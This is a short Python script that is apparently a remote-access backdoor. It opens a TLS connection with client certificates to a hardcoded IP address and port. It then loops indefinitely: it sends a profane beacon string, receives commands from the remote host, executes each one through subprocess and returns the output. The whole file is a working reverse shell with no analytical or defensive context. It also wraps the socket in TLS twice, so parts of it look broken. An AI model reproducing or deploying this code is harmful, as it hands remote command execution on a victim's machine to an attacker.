import os
import socket
import subprocess
import shlex
import time
import ssl

host = '172.16.209.89'
port = 8989

server_sni_hostname = 'RPMS'
server_cert = 'server.crt'
client_cert = 'clientcertchainf.crt'
#client_key = 'client.key'

context = ssl.SSLContext(protocol=ssl.PROTOCOL_TLSv1_2,
                         purpose=ssl.Purpose.SERVER_AUTH, cafile=server_cert)
#context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=server_cert)
context.load_cert_chain(certfile=client_cert)
cipher = 'TLS_ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384'
context.set_ciphers(cipher)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s = context.wrap_socket(s, server_side=False,
                        server_hostname=server_sni_hostname)


def ConnectToHost():
    global s
    while True:
        try:
            s.connect((host, port))
            s = context.wrap_socket(
                s, server_side=False, server_hostname=server_sni_hostname)
            print("[ OK ] Connected to host : ", str(host))
            # Clientdata=input()
            # s.send(str.encode(Clientdata))
            while True:
                time.sleep(5)
                try:
                    s.send(str.encode("HEY MOTHERFUCKER"))
                    cmd = s.recv(1024)  # decode before use
                    cmd = cmd.decode("utf-8")
                    if(cmd != "testsig"):
                        cmd = shlex.split(cmd)
                        out = subprocess.Popen(
                            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                        stdout, stderr = out.communicate()
                        s.send(stdout)
                except socket.error as errmssg:
                    print("[ FAILED] " + str(errmssg))

        except socket.error as errmssg:
            print("[ FAILED ] Failed To connect To Host : "+str(errmssg))


ConnectToHost()
